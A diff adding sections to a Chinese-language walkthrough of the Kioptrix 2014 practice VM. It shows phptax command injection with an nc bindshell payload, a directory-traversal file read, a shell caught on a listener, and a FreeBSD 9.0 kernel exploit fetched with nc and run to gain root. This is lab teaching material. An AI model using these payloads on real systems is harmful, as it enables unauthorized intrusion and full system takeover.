@@ -823,6 +823,18 @@ Include etc/apache22/Includes/*.conf
 </td></tr></tbody></table>
 </body></html>
 ```
+```shell
+┌──(root㉿kali)-[/kioptrix4]
+└─# searchsploit phptax
+------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                       |  Path
+------------------------------------------------------------------------------------- ---------------------------------
+PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit)                       | php/webapps/21833.rb
+PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution                    | php/webapps/25849.txt
+phptax 0.8 - Remote Code Execution                                                   | php/webapps/21665.txt
+------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
 </details>
 
 ## 1.4. 漏洞利用
@@ -920,7 +932,171 @@ Array
 <pre><img src="https://github.com/eagleatman/mywriteup/blob/main/kioptrix-2014/images/1.png" width="56%" /></pre>
 </details>
 
+<details><summary>3. phptax</summary>
+
+```shell
+┌──(root㉿kali)-[/kioptrix4]
+└─# searchsploit -p php/webapps/21665.txt
+  Exploit: phptax 0.8 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/21665
+     Path: /usr/share/exploitdb/exploits/php/webapps/21665.txt
+File Type: ASCII text
+┌──(root㉿kali)-[/kioptrix4]
+└─# cp /usr/share/exploitdb/exploits/php/webapps/21665.txt .
+┌──(root㉿kali)-[/kioptrix4]
+└─# cat 21665.txt
+-----------------------------------------------------
+phptax 0.8 <= Remote Code Execution Vulnerability
+-----------------------------------------------------
+Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
+Vendor information:
+"PhpTax is free software to do your U.S. income taxes. Tested under Unix environment.
+The program generates .pdfs that can be printed and sent to the IRS. See homepage for details and screenshot."
+Vendor URI: http://sourceforge.net/projects/phptax/
+----------------------------------------------------
+Risk-level: High
+The application is prone to a remote code execution vulnerability.
+----------------------------------------------------
+drawimage.php, line 63:
+include ("./files/$_GET[pfilez]");
+// makes a png image
+$pfilef=str_replace(".tob",".png",$_GET[pfilez]);
+$pfilep=str_replace(".tob",".pdf",$_GET[pfilez]);
+Header("Content-type: image/png");
+if ($_GET[pdf] == "") Imagepng($image);
+if ($_GET[pdf] == "make") Imagepng($image,"./data/pdf/$pfilef");
+if ($_GET[pdf] == "make") exec("convert ./data/pdf/$pfilef ./data/pdf/$pfilep");
+----------------------------------------------------
+Exploit / Proof of Concept:
+Bindshell on port 23235 using netcat:
+http://localhost/phptax/drawimage.php?pfilez=xxx;%20nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make
+** Exploit-DB Verified:**
+http://localhost/phptax/index.php?pfilez=1040d1-pg2.tob;nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make
+----------------------------------------------------
+Solution:
+Do some input validation.
+----------------------------------------------------
+```
+<pre>用burpsuite重放执行命令，同时利用目录遍历确认命令是否执行成功：</pre>
+<pre><img src="https://github.com/eagleatman/mywriteup/blob/main/kioptrix-2014/images/3.png" width="56%" /></pre>
+<pre><img src="https://github.com/eagleatman/mywriteup/blob/main/kioptrix-2014/images/4.png" width="56%" /></pre>
+```shell
+┌──(root㉿kali)-[/kioptrix4]
+└─# curl -A "Mozilla/4.0" "http://192.168.0.103:8080/phptax/drawimage.php?pfilez=xxx;nc+-h+2>+/tmp/nc;&pdf=make"
+?>
+# LFI读取/tmp/nc文件，我在这里犯了想当然的错误，以为有nc就可以反弹shell，殊不知nc有多个版本，有些支持-e选项，有些不支持，而恰巧这个目标就不支持。
+# 当然也无需担心，我们有多种方式可以反弹shell，
+# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell
+# 唯一需要确认的是：服务器当前支持哪种方式，使用的那种终端类型($0, $$查看进程，ps -p pid)。
+┌──(root㉿kali)-[/kioptrix4]
+└─# curl "http://192.168.0.103/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f../tmp/nc" | html2text
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  4966  100  4966    0     0  1889k      0 --:--:-- --:--:-- --:--:-- 2424k
+usage: nc [-46DdEhklnrStUuvz] [-e policy] [-I length] [-i interval] [-O length]
+      [-P proxy_username] [-p source_port] [-s source] [-T ToS]
+      [-V rtable] [-w timeout] [-X proxy_protocol]
+      [-x proxy_address[:port]] [destination] [port]
+    Command Summary:
+        -4        Use IPv4
+        -6        Use IPv6
+        -D        Enable the debug socket option
+        -d        Detach from stdin
+        -E        Use IPsec ESP
+        -e policy    Use specified IPsec policy
+        -h        This help text
+        -I length    TCP receive buffer length
+        -i secs        Delay interval for lines sent, ports scanned
+        -k        Keep inbound sockets open for multiple connects
+        -l        Listen mode, for inbound connects
+        -n        Suppress name/port resolutions
+        --no-tcpopt    Disable TCP options
+        -O length    TCP send buffer length
+        -P proxyuser    Username for proxy authentication
+        -p port        Specify local port for remote connects
+        -r        Randomize remote ports
+        -S        Enable the TCP MD5 signature option
+        -s addr        Local source address
+        -T ToS        Set IP Type of Service
+        -t        Answer TELNET negotiation
+        -U        Use UNIX domain socket
+        -u        UDP mode
+        -V rtable    Specify alternate routing table
+        -v        Verbose
+        -w secs        Timeout for connects and final net reads
+        -X proto    Proxy protocol: "4", "5" (SOCKS) or "connect"
+        -x addr[:port]    Specify proxy address and port
+        -z        Zero-I/O mode [used for scanning]
+    Port numbers can be individual or ranges: lo-hi [inclusive]
+See ipsec_set_policy(3) for -e argument format
+```
+<pre>我们使用perl</pre>
+<pre><img src="https://github.com/eagleatman/mywriteup/blob/main/kioptrix-2014/images/5.png" width="56%" /></pre>
+
+```shell
+# 成功拿到一个shell
+┌──(root㉿kali)-[/kioptrix4]
+└─# nc -nlkvp 3306
+listening on [any] 3306 ...
+connect to [192.168.0.100] from (UNKNOWN) [192.168.0.103] 45961
+sh: can't access tty; job control turned off
+$ pwd
+/usr/local/www/apache22/data2/phptax
+$ echo $0
+sh
+$ echo $$
+2931
+$ ps -p 2931
+  PID  TT  STAT    TIME COMMAND
+ 2931  ??  S    0:00.01 sh -i
+```
+</details>
+
 ## 1.5. 后渗透
+<details><summary>1. 提权</summary></details>
+
+```shell
+# 经过两个测试两种提权脚本都是可以成功的，大家可以自己测试一下。
+┌──(root㉿kali)-[/kioptrix4]
+└─# searchsploit freebsd 9.0
+------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                       |  Path
+------------------------------------------------------------------------------------- ---------------------------------
+FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation                               | freebsd/local/28718.c
+FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation                         | freebsd/local/26368.c
+------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+$ whoami
+www
+$ nc 192.168.0.100 5555 > exploit1.c
+$ gcc exploit1.c -o exploit1
+exploit1.c:178:2: warning: no newline at end of file
+$ ls -al
+total 128
+drwxrwxrwt   7 root   wheel    512 Jun 11 00:27 .
+drwxr-xr-x  18 root   wheel   1024 Jun  9 22:14 ..
+drwxrwxrwt   2 root   wheel    512 Jun  9 22:14 .ICE-unix
+drwxrwxrwt   2 root   wheel    512 Jun  9 22:14 .X11-unix
+drwxrwxrwt   2 root   wheel    512 Jun  9 22:14 .XIM-unix
+drwxrwxrwt   2 root   wheel    512 Jun  9 22:14 .font-unix
+-rw-------   1 www    wheel      0 Jun  9 22:15 apr7D2DN3
+-rwxr-xr-x   1 www    wheel   8498 Jun 11 00:24 exploit
+-rw-r--r--   1 www    wheel   2125 Jun 11 00:23 exploit.c
+-rwxr-xr-x   1 www    wheel  10409 Jun 11 00:27 exploit1
+-rw-r--r--   1 www    wheel   5380 Jun 11 00:26 exploit1.c
+srwxrwxrwx   1 mysql  wheel      0 Jun  9 22:15 mysql.sock
+drwxr-xr-x   2 root   wheel    512 Oct  7  2013 vmware-fonts0
+$ ./exploit1
+[+] SYSRET FUCKUP!!
+[+] Start Engine...
+[+] Crotz...
+[+] Crotz...
+[+] Crotz...
+[+] Woohoo!!!
+$ id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+```
+</details>
 ## 1.6. 报告
 
 
